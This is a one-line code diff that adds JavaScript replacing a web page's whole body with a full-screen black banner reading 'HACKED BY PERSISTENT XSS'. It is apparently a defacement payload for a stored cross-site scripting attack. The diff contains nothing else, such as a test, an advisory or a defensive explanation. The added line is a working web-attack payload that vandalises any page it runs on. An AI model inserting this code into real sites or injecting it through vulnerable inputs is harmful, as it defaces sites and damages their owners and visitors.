@@ -1,0 +1,1 @@
+document.body.innerHTML = "<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;'><h1>HACKED BY PERSISTENT XSS</h1></div>";
